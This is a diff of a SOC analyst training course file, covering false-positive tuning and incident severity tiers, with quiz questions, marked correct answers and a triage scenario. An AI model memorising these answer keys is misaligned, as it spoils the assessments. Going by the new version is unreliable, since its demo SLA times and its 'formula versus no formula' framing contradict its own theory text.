-          id: 'u4-q2',
-          question: 'What is a "Benign True Positive" (BTP)?',
-          options: [
-            'An alert rule that was completely broken and produced no output',
-            'The rule triggered correctly because the condition occurred, but investigation confirmed the action was authorized and safe',
-            'A virus that helps speed up computer performance',
-            'An alert that fired on an employee playing video games',
+          "id": "u4-q2",
+          "question": "Which of the following is the most reliable method to verify if suspicious admin activity is authorized Expected Activity?",
+          "options": [
+            "Asking the employee on Slack if they did it",
+            "Checking the enterprise Change Management system (e.g. ServiceNow CHG tickets) for an approved maintenance window",
+            "Assuming anything done by an IT admin is always safe",
+            "Waiting 24 hours to see if anything breaks"
           ],
-          correctAnswer: 1,
-          explanation: 'In a BTP, the behavior occurred as defined (e.g. an admin ran PowerShell remoting), but it was authorized IT work.',
+          "correctAnswer": 1,
+          "explanation": "Authorized IT maintenance and deployments are documented in approved Change Management tickets."
         },
         {
-          id: 'u4-q3',
-          question: 'What is the primary danger of broad, sloppy rule tuning (e.g., allowlisting an entire user account)?',
-          options: [
-            'It creates dangerous blind spots that adversaries can exploit if that account is compromised',
-            'It slows down internet connection speeds for the entire company',
-            'It deletes the user Windows profile',
-            'It uses up too many IP addresses',
+          "id": "u4-q3",
+          "question": "What is the primary operational danger of having an excessively high False Positive Rate in the SOC?",
+          "options": [
+            "The SIEM database runs out of disk space",
+            "Analyst alert fatigue leads to genuine attacks being overlooked or hastily closed",
+            "Antivirus licenses expire faster",
+            "Network bandwidth slows down by 50%"
           ],
-          correctAnswer: 0,
-          explanation: 'Overly broad allowlists blind the SOC to attacks originating from compromised legitimate credentials.',
+          "correctAnswer": 1,
+          "explanation": "Alert fatigue causes exhausted analysts to overlook subtle indicators of genuine compromise."
         },
         {
-          id: 'u4-q4',
-          question: 'An edge firewall drops 10,000 automated port scan packets from random internet IPs daily. Why should this NOT trigger an analyst alert?',
-          options: [
-            'Because firewalls are not part of the security architecture',
-            'Because the packets were blocked at the perimeter and represent background internet noise with zero internal impact',
-            'Because internet users have a legal right to scan corporate networks',
-            'Because the SIEM cannot process firewall logs',
+          "id": "u4-q4",
+          "question": "When submitting a tuning request to Detection Engineering for a noisy rule, what information must the Tier 1 analyst provide?",
+          "options": [
+            "Just say \"the rule is bad\"",
+            "The Alert ID, raw log payload, why it is benign, and specific narrow exclusion criteria (e.g. parent process, path, hash)",
+            "A request to delete the entire SIEM rule completely",
+            "The user password"
           ],
-          correctAnswer: 1,
-          explanation: 'Alerting on blocked external scans floods analysts with noise; alerts should focus on accepted connections or internal propagation.',
-        },
-        {
-          id: 'u4-q5',
-          question: 'How should an analyst document the closure of an alert verified as a False Positive?',
-          options: [
-            'Leave the ticket blank and click close',
-            'Document the evidence verified, the legitimate business reason, and a recommendation for rule tuning',
-            'Blame the software vendor in the public notes',
-            'Delete the raw log files so they do not show up in searches',
-          ],
-          correctAnswer: 1,
-          explanation: 'Detailed FP documentation justifies closure and provides detection engineers the exact data needed to tune the rule.',
-        },
-      ],
-    },
+          "correctAnswer": 1,
+          "explanation": "Specific evidence and narrow exclusion recommendations allow engineers to tune out noise without creating blind spots."
+        }
+      ]
+    }
   },
-
-  // =========================================================================
-  // UNIT 5: SEVERITY
-  // =========================================================================
   {
-    id: 'unit-5',
-    unitNumber: 5,
-    title: 'Unit 5: Severity',
-    description: 'Master severity tiering (Low, Medium, High, Critical), understand the mathematics of Impact vs. Confidence, and classify live incidents.',
-    estimatedHours: 2,
-    topics: [
+    "id": "unit-5",
+    "unitNumber": 5,
+    "title": "Unit 5: Severity",
+    "description": "Master incident severity classification (Low, Medium, High, Critical) using asset impact, attacker progress, evidence confidence, and SLA timers.",
+    "estimatedHours": 0.5,
+    "topics": [
       {
-        id: 'topic-5-1',
-        unitId: 'unit-5',
-        title: 'Severity Tiers: Low, Medium, High & Critical',
-        order: 1,
-        estimatedMinutes: 20,
-        xpReward: 50,
-        theory: {
-          summaryLines: [
-            'Severity determines how urgently an incident must be addressed and allocates the organization\'s defensive resources.',
-            'Critical (P1): Active catastrophe. Crown jewels compromised (Domain Controllers, customer databases, active ransomware). SLA: Immediate response (< 15 mins).',
-            'High (P2): Severe compromise with containment intact. Malware running on executive laptop, unauthorized privilege escalation. SLA: < 1 hour.',
-            'Medium (P3): Suspicious policy violation or contained threat. Phishing email delivered with malicious link not clicked, adware on standard workstation. SLA: < 4 hours.',
-            'Low (P4): Minor informational anomaly. Inbound port scans blocked by firewall, routine password resets, policy warnings. SLA: < 24-48 hours.',
-            'Misclassifying severity leads to burnout on trivial alerts or disastrous delays on critical breaches.',
+        "id": "topic-5-1",
+        "unitId": "unit-5",
+        "title": "Chapter 1: Severity Scale: Low, Medium, High & Critical",
+        "order": 1,
+        "estimatedMinutes": 15,
+        "xpReward": 50,
+        "theory": {
+          "summaryLines": [
+            "Severity ratings dictate the urgency, response speed, resource allocation, and escalation thresholds for an alert.",
+            "Critical (P1): Active widespread ransomware, domain controller compromise, or data exfiltration. SLA: 15-minute response, 24/7 immediate callout.",
+            "High (P2): Single-host malware execution, compromised privileged account, or active C2 beaconing. SLA: 1-hour response.",
+            "Medium (P3): Isolated suspicious activity, unauthorized software installation, or multiple failed logins on non-critical assets. SLA: 4-hour response.",
+            "Low (P4): Minor policy violations, single port scans, adware detections, or low-probability anomalies. SLA: 24-hour response.",
+            "Service Level Agreements (SLAs) measure Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR)."
           ],
-          knowMore: {
-            title: 'FIRST Common Vulnerability Scoring System (CVSS)',
-            description: 'Learn the international industry standard for assessing the severity of computer system vulnerabilities.',
-            externalUrl: 'https://www.first.org/cvss/',
-            externalLabel: 'Explore CVSS Metrics',
-          },
+          "knowMore": {
+            "title": "FIRST Common Vulnerability Scoring System (CVSS) and Severity Metrics",
+            "description": "Learn the international industry standard for assessing vulnerability severity and translating impact into operational SOC priority.",
+            "externalUrl": "https://www.first.org/cvss/",
+            "externalLabel": "FIRST CVSS Standards"
+          }
         },
-        demo: {
-          title: 'The Severity Matrix & SLA Countdown',
-          subtitle: 'Visualizing response times and escalation thresholds across P1 through P4 tiers.',
-          steps: [
-            {
-              stepNumber: 1,
-              title: 'P1: The Active Ransomware Crisis',
-              description: 'Alert: Active mass file encryption detected on primary ERP storage cluster. 15-minute SLA clock initiates war room assembly.',
-              visualType: 'dashboard',
-              highlightElements: ['p1-critical', 'sla-15min', 'war-room'],
-              narration: 'Critical incidents demand all-hands emergency response and executive notification.',
-            },
-            {
-              stepNumber: 2,
-              title: 'P3: The Contained Phishing Lure',
-              description: 'Alert: Credential harvesting email received by 3 employees; email gateway quarantined the message before opening.',
-              visualType: 'dashboard',
-              highlightElements: ['p3-medium', 'sla-4hr'],
-              narration: 'Contained events follow standard operational queues without emergency disruption.',
-            },
-          ],
+        "demo": {
+                  "title": "[Demo] How Serious Is It? The Severity Continuum",
+                  "subtitle": "Watch how the same alert type escalates in priority as scope, impact, and adversarial progression increase",
+                  "steps": [
+                            {
+                                      "id": 1,
+                                      "stage": "1. Low Severity",
+                                      "iconName": "endpoint",
+                                      "title": "Isolated Anomaly on Standard Workstation",
+                                      "description": "4 failed logins on workstation FIN-PC-04, known user, followed immediately by successful logon.",
+                                      "telemetrySnippet": "SEVERITY: LOW | Scope: Single Standard PC | Impact: None | User: Finance01 | Resolved",
+                                      "highlightText": "Low severity alerts involve minimal business impact and isolated, non-critical assets."
+                            },
+                            {
+                                      "id": 2,
+                                      "stage": "2. Medium Severity",
+                                      "iconName": "server",
+                                      "title": "Multiple Failures Across Sensitive Subnet",
+                                      "description": "20 failed logins targeting a finance supervisor account originating from an unfamiliar internal subnet.",
+                                      "telemetrySnippet": "SEVERITY: MEDIUM | Scope: Elevated Account | Subnet: Unknown Internal | SLA: 30 Mins",
+                                      "highlightText": "Medium severity indicates potential internal scanning or probing against sensitive personnel."
+                            },
+                            {
+                                      "id": 3,
+                                      "stage": "3. High Severity",
+                                      "iconName": "siem",
+                                      "title": "Password Spray Against Domain Admins",
+                                      "description": "External adversary testing leaked passwords against all Domain Administrator and executive accounts.",
+                                      "telemetrySnippet": "SEVERITY: HIGH | Scope: Domain Admins Targeted | Source: External WAN | SLA: 15 Mins",
+                                      "highlightText": "High severity reflects active adversary campaigns threatening privileged credentials or core systems."
+                            },
+                            {
+                                      "id": 4,
+                                      "stage": "4. Critical Severity",
+                                      "iconName": "attacker",
+                                      "title": "Breach on Primary Domain Controller",
+                                      "description": "Failed logins on Domain Controller followed by successful authentication, privilege escalation, and data staging.",
+                                      "telemetrySnippet": "SEVERITY: CRITICAL | Scope: Primary DC Compromised | Active Lateral Movement | All Hands",
+                                      "highlightText": "Critical severity requires immediate all-hands containment: the core business is under active threat."
+                            },
+                            {
+                                      "id": 5,
+                                      "stage": "5. Analyst Prioritization",
+                                      "iconName": "analyst",
+                                      "title": "Prioritize by Impact, Not Just Volume",
+                                      "description": "L1 analysts triage queue items based on asset criticality and attacker progress, not just alert arrival time.",
+                                      "telemetrySnippet": "QUEUE MANAGEMENT: Critical DC Alert jumped to #1 Priority | Low alerts held in queue",
+                                      "highlightText": "Effective severity classification ensures critical incidents receive instant containment."
+                            }
+                  ]
         },
-        interactive: {
-          title: 'Severity Tier Matrix Explorer',
-          scenario: 'Explore the 4 standard priority tiers, their SLA countdowns, and the required operational response protocols.',
-          cards: [
-            {
-              id: 'card-sev1',
-              title: 'P1 - Critical Severity',
-              source: 'Emergency Response SLA',
-              timestamp: '< 15 Mins Response',
-              category: 'host',
-              summary: 'Domain controller compromise, root-level cloud breach, active ransomware encryption across network.',
-              details: [
-                { label: 'Required Action', value: 'Assemble incident war room, notify CISO, invoke emergency isolation' },
-                { label: 'SLA Window', value: 'Immediate response within 15 minutes' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 100,
-              tags: ['P1', 'Critical', 'Emergency'],
-            },
-            {
-              id: 'card-sev2',
-              title: 'P2 - High Severity',
-              source: 'Urgent Incident SLA',
-              timestamp: '< 1 Hour Response',
-              category: 'user',
-              summary: 'Malware active in RAM on single workstation, unauthorized administrative account created, active C2 beaconing.',
-              details: [
-                { label: 'Required Action', value: 'Isolate affected host, dump volatile memory, revoke compromised credentials' },
-                { label: 'SLA Window', value: 'Containment within 60 minutes' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 85,
-              tags: ['P2', 'High', 'Urgent'],
-            },
-            {
-              id: 'card-sev3',
-              title: 'P3 - Medium Severity',
-              source: 'Standard Operational SLA',
-              timestamp: '< 4 Hours Response',
-              category: 'network',
-              summary: 'Quarantined phishing attachments, suspicious login from unusual country blocked by MFA, adware installation.',
-              details: [
-                { label: 'Required Action', value: 'Investigate potential user interaction, purge malicious emails from mailboxes' },
-                { label: 'SLA Window', value: 'Triage within 4 business hours' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 50,
-              tags: ['P3', 'Medium', 'Standard'],
-            },
-            {
-              id: 'card-sev4',
-              title: 'P4 - Low Severity',
-              source: 'Informational SLA',
-              timestamp: '< 24 Hours Response',
-              category: 'host',
-              summary: 'Blocked inbound perimeter port scans, routine policy warnings, software version deprecation notice.',
-              details: [
-                { label: 'Required Action', value: 'Batch review during regular shift hours, aggregate for trend metrics' },
-                { label: 'SLA Window', value: 'Review within 24 to 48 hours' },
-              ],
-              isSuspicious: false,
-              relevanceScore: 20,
-              tags: ['P4', 'Low', 'Informational'],
-            },
-          ],
+        "interactive": {
+                  "title": "[Interactive] Set the Priority",
+                  "scenario": "Evaluate each incident situation and assign it to the appropriate severity level: Low, Medium, or High.",
+                  "cards": [
+                            {
+                                      "id": "sev-low",
+                                      "category": "User",
+                                      "label": "Employee mistypes password on laptop",
+                                      "summary": "User mistypes password 5 times before successfully logging in; source is local corporate office.",
+                                      "detailedFindings": "Priority: LOW. Minor user friction with zero indicator of adversary involvement.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "sev-med",
+                                      "category": "Source IP",
+                                      "label": "Unfamiliar IP port scanning internal file server",
+                                      "summary": "Internal host scans ports 445 and 3389 across the finance file server; no connections completed.",
+                                      "detailedFindings": "Priority: MEDIUM. Suspicious internal reconnaissance requiring host investigation.",
+                                      "severityIndicator": "Suspicious"
+                            },
+                            {
+                                      "id": "sev-high",
+                                      "category": "Event ID",
+                                      "label": "Compromised Domain Admin accessing executive share",
+                                      "summary": "Domain administrator account accessing confidential executive M&A folders at 02:00 AM from a VPN IP.",
+                                      "detailedFindings": "Priority: HIGH. High-privilege identity anomaly with immediate enterprise risk.",
+                                      "severityIndicator": "Malicious"
+                            }
+                  ]
         },
-        socContext: {
-          title: 'The "Everything is Critical" Trap',
-          scenario: 'A SOC categorized all 300 daily alerts as "Critical", resulting in analysts ignoring alarms and missing an actual domain takeover.',
-          analystMindset: 'If everything is high priority, nothing is high priority. Reserve P1 strictly for true existential threats to business operations.',
-          bestPractices: [
-            'Maintain strict criteria for P1 declaration; only Tier 2 leads or SOC managers should approve P1 escalations.',
-            'Automate initial containment for P1 threats (e.g. automatic network quarantine via EDR).',
-            'Track SLA breach rates weekly to identify operational bottlenecks.',
-          ],
+        "socContext": {
+          "title": "Managing SLA Breach Risks",
+          "scenario": "A Critical alert fires at 02:00 AM. The on-duty Tier 1 analyst leaves it in queue because their shift ends in 30 minutes.",
+          "analystMindset": "A Critical SLA timer never stops. A P1 breach must be acknowledged and contained immediately, regardless of shift changes.",
+          "bestPractices": [
+            "Acknowledge P1/Critical alerts within 5 minutes to stop the SLA clock.",
+            "Never downgrade an alert severity simply to avoid an SLA breach penalty.",
+            "Conduct a formal handoff meeting for any open High or Critical alerts at shift handover."
+          ]
         },
-        knowledgeCheck: {
-          matching: {
-            title: 'Match Scenario to Correct Severity Tier',
-            instructions: 'Pair each incident scenario with its appropriate severity classification.',
-            pairs: [
-              { id: 'sev-1', left: 'Active ransomware encrypting the enterprise database server', right: 'Critical (P1)' },
-              { id: 'sev-2', left: 'Executive laptop executing Mimikatz credential dumper', right: 'High (P2)' },
-              { id: 'sev-3', left: 'Malicious email attachment quarantined by gateway before delivery', right: 'Medium (P3)' },
-              { id: 'sev-4', left: 'External internet scanner probing closed firewall port 80', right: 'Low (P4)' },
+        "knowledgeCheck": {
+          "matching": {
+            "title": "Match Severity Levels to Target Response SLAs",
+            "instructions": "Match each severity level with its typical enterprise SOC response timeframe.",
+            "pairs": [
+              {
+                "id": "sv1",
+                "left": "Critical (P1)",
+                "right": "15 Minutes (Immediate 24/7 callout & containment)"
+              },
+              {
+                "id": "sv2",
+                "left": "High (P2)",
+                "right": "1 Hour (Active single-system compromise response)"
+              },
+              {
+                "id": "sv3",
+                "left": "Medium (P3)",
+                "right": "4 Hours (Isolated suspicious activity investigation)"
+              },
+              {
+                "id": "sv4",
+                "left": "Low (P4)",
+                "right": "24 Hours (Low risk policy violations and hygiene)"
+              }
             ],
-            explanation: 'Severity correlates directly with potential business damage and attack progression stage.',
-          },
-        },
+            "explanation": "Critical alerts require immediate 15-minute response; Low alerts allow 24-hour business day triage."
+          }
+        }
       },
       {
-        id: 'topic-5-2',
-        unitId: 'unit-5',
-        title: 'Impact, Confidence & Severity Classification Lab',
-        order: 2,
-        estimatedMinutes: 25,
-        xpReward: 60,
-        theory: {
-          summaryLines: [
-            'Severity is not a subjective guess; it is calculated using two primary variables: Impact and Confidence.',
-            'Impact = Asset Criticality (Crown Jewel vs Test VM) + Business Disruption Potential + Data Sensitivity (PCI/HIPAA/PII).',
-            'Confidence = Detection Fidelity (Single heuristic vs Multiple corroborating logs) + Threat Intelligence validation.',
-            'The Severity Formula: High Impact + High Confidence = Critical (P1). High Impact + Low Confidence = Medium/High (Investigate urgently).',
-            'Low Impact + Low Confidence = Low (P4). Analysts use this formula to categorize alerts objectively.',
+        "id": "topic-5-2",
+        "unitId": "unit-5",
+        "title": "Chapter 2: Impact, Confidence & [Lab] 🔵 Severity Classification",
+        "order": 2,
+        "estimatedMinutes": 15,
+        "xpReward": 75,
+        "theory": {
+          "summaryLines": [
+            "Severity is not arbitrary; it is calculated using the formula: Severity = Impact × Confidence.",
+            "Impact measures the potential harm to the business: Asset Criticality (Crown Jewels vs guest VM) + Attacker Objective (Reconnaissance vs Destruction).",
+            "Confidence measures the fidelity of the telemetry: Single heuristic anomaly (Low Confidence) vs Multiple corroborating EDR + Firewall IOCs (High Confidence).",
+            "A High Impact alert with Low Confidence requires urgent verification before shutting down production systems.",
+            "A High Impact alert with High Confidence requires immediate emergency containment."
           ],
-          knowMore: {
-            title: 'NIST Risk Management Framework (RMF)',
-            description: 'Explore how organizations systematically categorize assets, evaluate impact, and manage cyber risks.',
-            externalUrl: 'https://csrc.nist.gov/projects/risk-management/about-rmf',
-            externalLabel: 'Explore NIST RMF Overview',
-          },
+          "knowMore": {
+            "title": "MITRE ATT&CK: Assessing Adversary Objectives and Impact",
+            "description": "Learn how to map threat actor tactics (Impact TA0040) to enterprise risk calculations.",
+            "externalUrl": "https://attack.mitre.org/tactics/TA0040/",
+            "externalLabel": "MITRE ATT&CK Impact"
+          }
         },
-        demo: {
-          title: 'The Impact × Confidence Calculator',
-          subtitle: 'Interactive calculation of incident risk based on asset value and detection reliability.',
-          steps: [
-            {
-              stepNumber: 1,
-              title: 'Evaluating Asset Criticality',
-              description: 'Is the target a test VM in an isolated sandbox or the Active Directory Domain Controller for 20,000 employees?',
-              visualType: 'dashboard',
-              highlightElements: ['asset-value', 'business-impact'],
-              narration: 'Asset value dramatically shifts the impact score.',
-            },
-            {
-              stepNumber: 2,
-              title: 'Evaluating Detection Confidence',
-              description: 'Did the alert trigger on an unverified anomaly, or does EDR report a confirmed SHA256 hash matching known Lazarus ransomware?',
-              visualType: 'terminal',
-              highlightElements: ['detection-confidence', 'threat-intel-match'],
-              narration: 'Corroborating indicators push confidence to 100%, producing an objective P1 severity rating.',
-            },
-          ],
+        "demo": {
+                  "title": "[Demo] Context Before Classification: Impact & Confidence",
+                  "subtitle": "See how asset value and evidence reliability shape triage priority without rigid mathematical formulas",
+                  "steps": [
+                            {
+                                      "id": 1,
+                                      "stage": "1. Evaluating Asset Impact",
+                                      "iconName": "endpoint",
+                                      "title": "Asset Value Sets Potential Risk",
+                                      "description": "A suspicious script on a guest Wi-Fi kiosk has minor business impact. The same script on the Core Banking Server is catastrophic.",
+                                      "telemetrySnippet": "IMPACT EVALUATION: Guest Kiosk = Minimal Impact | Core Banking SWIFT Server = Catastrophic Impact",
+                                      "highlightText": "Asset criticality defines what the organization stands to lose if the asset is compromised."
+                            },
+                            {
+                                      "id": 2,
+                                      "stage": "2. Evaluating Evidence Confidence",
+                                      "iconName": "server",
+                                      "title": "Evidence Reliability Sets Certainty",
+                                      "description": "An unverified anomaly score provides low confidence. Confirmed threat intel plus malicious process execution provides high confidence.",
+                                      "telemetrySnippet": "CONFIDENCE: Heuristic Score (Low) vs. Known Malware Hash + Active C2 Connection (High)",
+                                      "highlightText": "Confidence measures how strongly the available technical artifacts prove malicious intent."
+                            },
+                            {
+                                      "id": 3,
+                                      "stage": "3. Combining the Two Dimensions",
+                                      "iconName": "siem",
+                                      "title": "Balancing Impact Against Confidence",
+                                      "description": "High Impact + High Confidence = Immediate Incident Declaration. Low Impact + Low Confidence = Standard Queue Triage.",
+                                      "telemetrySnippet": "MATRIX: High Impact & High Confidence -> P1 Emergency | Low & Low -> Routine Review",
+                                      "highlightText": "Analyst triage weighs potential business harm alongside technical evidence certainty."
+                            },
+                            {
+                                      "id": 4,
+                                      "stage": "4. The Real-World Asymmetry",
+                                      "iconName": "attacker",
+                                      "title": "Why High Impact Always Escalates",
+                                      "description": "Even low-confidence alerts must be prioritized if they target Tier-0 crown jewels like Active Directory or payment gateways.",
+                                      "telemetrySnippet": "OPERATIONAL REALITY: Domain Controller alert must be checked immediately, even if confidence is low.",
+                                      "highlightText": "When critical assets are threatened, the cost of a false negative far outweighs false positive triage time."
+                            },
+                            {
+                                      "id": 5,
+                                      "stage": "5. Professional Classification",
+                                      "iconName": "analyst",
+                                      "title": "Context-Driven Decision Making",
+                                      "description": "L1 analysts classify incidents based on realistic business context rather than mathematical formulas.",
+                                      "telemetrySnippet": "CLASSIFICATION: Priority 1 (High Impact Crown Jewel) | Escalation Dispatched to L2 Response",
+                                      "highlightText": "Professional severity classification requires understanding the business, not just the logs."
+                            }
+                  ]
         },
-        interactive: {
-          title: 'Hands-On Lab: Severity Classification',
-          scenario: 'Evaluate 3 challenging incident tickets. Weigh the Impact and Confidence factors and classify each into its correct severity tier.',
-          cards: [
-            {
-              id: 'card-lab-sev1',
-              title: 'Incident A: Staging Lab VM Mining Monero',
-              source: 'Cloud Telemetry',
-              timestamp: '08:30:00 UTC',
-              category: 'host',
-              summary: 'XMRig crypto-miner found running on disposable QA testing instance. Zero production data present; host completely isolated from corporate subnet.',
-              details: [
-                { label: 'Impact Factor', value: 'Low (Disposable test VM, zero sensitive data)' },
-                { label: 'Confidence Factor', value: 'High (Confirmed miner binary)' },
-                { label: 'Correct Tier', value: 'Medium (P3) / Low (P4)' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 60,
-              tags: ['Lab-Severity', 'Crypto-Miner', 'P3'],
-            },
-            {
-              id: 'card-lab-sev2',
-              title: 'Incident B: Unverified Beacon from CFO Workstation',
-              source: 'Network Flow Anomaly',
-              timestamp: '08:45:12 UTC',
-              category: 'network',
-              summary: 'Heuristic anomaly detection flagged periodic 5-minute beaconing from Chief Financial Officer laptop to newly registered overseas IP.',
-              details: [
-                { label: 'Impact Factor', value: 'Critical (Crown jewel user with banking credentials)' },
-                { label: 'Confidence Factor', value: 'Medium (Heuristic anomaly requiring confirmation)' },
-                { label: 'Correct Tier', value: 'High (P2) - Urgent investigation required' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 92,
-              tags: ['Lab-Severity', 'Executive-Target', 'P2'],
-            },
-            {
-              id: 'card-lab-sev3',
-              title: 'Incident C: Active Ransomware on Core ERP Database',
-              source: 'EDR Alert + File Integrity Monitor',
-              timestamp: '09:00:00 UTC',
-              category: 'host',
-              summary: 'Volume shadow copies deleted; 50,000 `.locked` files created on primary manufacturing database server in under 3 minutes.',
-              details: [
-                { label: 'Impact Factor', value: 'Catastrophic (Entire company operations halted)' },
-                { label: 'Confidence Factor', value: '100% (Confirmed active destruction)' },
-                { label: 'Correct Tier', value: 'Critical (P1) - Immediate War Room' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 100,
-              tags: ['Lab-Severity', 'Ransomware', 'P1'],
-            },
-          ],
+        "interactive": {
+                  "title": "[Interactive] What Changes Your Assessment?",
+                  "scenario": "Add context factors to the investigation workbench and observe how they increase or decrease the incident triage priority.",
+                  "cards": [
+                            {
+                                      "id": "fac-crown",
+                                      "category": "User",
+                                      "label": "Target Asset: Core SWIFT Banking Server",
+                                      "summary": "Asset handles live wire transactions and customer payment processing.",
+                                      "detailedFindings": "Effect: MAJOR PRIORITY BOOST. Threat to mission-critical asset elevates any alert to immediate high priority.",
+                                      "severityIndicator": "Malicious"
+                            },
+                            {
+                                      "id": "fac-kiosk",
+                                      "category": "Source IP",
+                                      "label": "Target Asset: Isolated Guest Wi-Fi Kiosk",
+                                      "summary": "Non-domain device segmented on an isolated guest Internet VLAN.",
+                                      "detailedFindings": "Effect: PRIORITY DECREASE. Compromise cannot access internal corporate network or sensitive data.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "fac-hash",
+                                      "category": "Event ID",
+                                      "label": "Evidence: Confirmed Malware Hash",
+                                      "summary": "File SHA256 matches verified threat intelligence signature from CISA advisory.",
+                                      "detailedFindings": "Effect: HIGH CONFIDENCE BOOST. Eliminates ambiguity and proves malicious intent.",
+                                      "severityIndicator": "Malicious"
+                            },
+                            {
+                                      "id": "fac-heur",
+                                      "category": "Timeline",
+                                      "label": "Evidence: Single Ambiguous Heuristic Score",
+                                      "summary": "Statistical model flagged unusual traffic volume with no supporting process anomalies.",
+                                      "detailedFindings": "Effect: VERIFICATION NEEDED. Requires analyst investigation to confirm if activity is benign.",
+                                      "severityIndicator": "Suspicious"
+                            }
+                  ]
         },
-        socContext: {
-          title: 'Asset Inventory is Everything',
-          scenario: 'An alert fired on an IP address `10.5.20.12`. Without an updated CMDB (Configuration Management Database), the analyst assumed it was an office printer. It was the SWIFT wire-transfer server.',
-          analystMindset: 'You cannot calculate severity without knowing what the asset does. Always verify asset classification in the CMDB.',
-          bestPractices: [
-            'Integrate the enterprise CMDB directly into SIEM alert views so asset criticality displays automatically.',
-            'Upgrade severity immediately if regulated data (credit cards, medical records) is exposed.',
-            'Document both Impact and Confidence ratings explicitly in the incident record.',
-          ],
+        "socContext": {
+          "title": "Avoiding Under-Categorization of Low-Noise Threats",
+          "scenario": "An attacker executes slow, stealthy reconnaissance (1 command every 6 hours) on a database server. Analyst flags it as Low because volume is small.",
+          "analystMindset": "Volume does not equal severity. Sophisticated nation-state actors generate very few alerts. Evaluate the asset value and actor intent.",
+          "bestPractices": [
+            "Classify any confirmed hands-on-keyboard activity on a server as High or Critical.",
+            "Factor in regulatory impact (GDPR, HIPAA, PCI-DSS) when assessing data breach severity.",
+            "Document the rationale behind severity upgrades or downgrades in the ticket log."
+          ]
         },
-        knowledgeCheck: {
-          dragDrop: {
-            title: 'Order Incidents by Urgency (Highest to Lowest)',
-            instructions: 'Rank the incidents in order of priority from most critical to least critical.',
-            items: [
-              { id: 'urg-1', label: '1. Ransomware deleting shadow copies on Core ERP Server', category: 'Priority 1 (Critical)' },
-              { id: 'urg-2', label: '2. Suspicious beaconing from CFO laptop to overseas IP', category: 'Priority 2 (High)' },
-              { id: 'urg-3', label: '3. Crypto-miner running on disposable testing VM', category: 'Priority 3 (Medium)' },
-              { id: 'urg-4', label: '4. Blocked external port scan hitting perimeter firewall', category: 'Priority 4 (Low)' },
+        "knowledgeCheck": {
+          "triageScenario": {
+            "id": "ts-sev-lab",
+            "alertName": "Alert ALT-502: Credential Compromise on Sensitive Payroll Workstation",
+            "severity": "HIGH",
+            "scenarioText": "User Finance01 on workstation FIN-PC-04 (FinCorp Payroll Department) suffered 8 brute force login failures followed by a successful interactive logon from an unauthorized Tor exit node at 02:40 AM outside business hours.",
+            "evidenceItems": [
+              {
+                "label": "Target Host Asset Value",
+                "value": "FIN-PC-04 (Tier 2 Sensitive Payroll Asset)",
+                "insight": "High Impact: Holds unencrypted corporate payroll and employee banking records"
+              },
+              {
+                "label": "Threat Behavior",
+                "value": "Brute-force credential cracking followed by interactive logon",
+                "insight": "High Confidence: Direct adversary session confirmed"
+              },
+              {
+                "label": "Temporal Anomaly",
+                "value": "02:40 AM Local Time (Off-Hours)",
+                "insight": "Deviates from Finance01 normal working hours (9 AM - 5 PM)"
+              }
             ],
-            explanation: 'Prioritization aligns defensive resources with existential business risk.',
-          },
-        },
-      },
+            "correctVerdict": "TRUE_POSITIVE",
+            "rationale": "High impact on a sensitive payroll workstation combined with high confidence from confirmed unauthorized off-hours access mandates classification as a High Severity (P2) incident under the 1-hour SLA.",
+            "analystAction": "Escalate ticket to Tier 2 with P2 High classification, trigger EDR network isolation on FIN-PC-04, and initiate credential revocation for Finance01."
+          }
+        }
+      }
     ],
-    assessment: {
-      id: 'unit-5-assessment',
-      title: 'Unit 5 Assessment: Severity',
-      passingScore: 80,
-      xpReward: 150,
-      questions: [
+    "assessment": {
+      "id": "unit-5-assessment",
+      "title": "Unit 5 Assessment: Severity Classification",
+      "passingScore": 75,
+      "xpReward": 100,
+      "questions": [
         {
-          id: 'u5-q1',
-          question: 'What two fundamental factors determine an incident\'s severity classification?',
-          options: [
-            'Monitor resolution and ambient room temperature',
-            'Business Impact (asset value, data sensitivity) and Detection Confidence',
-            'The number of characters in the analyst\'s password',
-            'How many days remain until the weekend',
+          "id": "u5-q1",
+          "question": "What are the two primary factors used to objectively determine incident severity?",
+          "options": [
+            "Day of the week and analyst mood",
+            "Asset Impact (Business Criticality) and Evidence Confidence (Fidelity)",
+            "Length of the alert name and number of characters",
+            "Operating system brand and CPU speed"
           ],
-          correctAnswer: 1,
-          explanation: 'Severity mathematically balances the potential business impact against the confidence of the detection.',
+          "correctAnswer": 1,
+          "explanation": "Severity is calculated by multiplying the potential Business Impact of the asset by the Confidence level of the telemetry."
         },
         {
-          id: 'u5-q2',
-          question: 'What is the typical response SLA for a Critical (P1) security incident?',
-          options: [
-            '2 to 3 business weeks',
-            'Under 15 minutes, with immediate bridge mobilization',
-            'Whenever the analyst finishes their lunch break',
-            'Only on Monday mornings',
+          "id": "u5-q2",
+          "question": "Which of the following incidents qualifies as a Critical (P1) severity rating?",
+          "options": [
+            "A single failed password attempt on a guest Wi-Fi portal",
+            "Active ransomware spreading across enterprise servers and domain controllers",
+            "An employee visiting a sports news website during lunch",
+            "A printer running low on toner"
           ],
-          correctAnswer: 1,
-          explanation: 'P1 incidents require near-instantaneous response (typically < 15 minutes) due to ongoing active damage.',
+          "correctAnswer": 1,
+          "explanation": "Ransomware impacting multiple servers or core domain controllers threatens business survival and is a Critical (P1) emergency."
         },
         {
-          id: 'u5-q3',
-          question: 'Why does an alert on an Executive or Financial workstation often carry higher severity than the same alert on an intern\'s laptop?',
-          options: [
-            'Executive laptops cost more money to purchase',
-            'Executives have higher access privileges, confidential corporate data, and financial authorization capabilities',
-            'Executives use different brands of keyboards',
-            'Interns are not protected by cybersecurity policies',
+          "id": "u5-q3",
+          "question": "In standard SOC operational metrics, what does \"MTTR\" stand for?",
+          "options": [
+            "Maximum Telemetry Tracking Record",
+            "Mean Time to Respond (or Remediate)",
+            "Main Threat Triage Routine",
+            "Multi-Tier Threat Recovery"
           ],
-          correctAnswer: 1,
-          explanation: 'Compromising high-privilege users provides attackers direct access to sensitive financial, legal, and operational systems.',
+          "correctAnswer": 1,
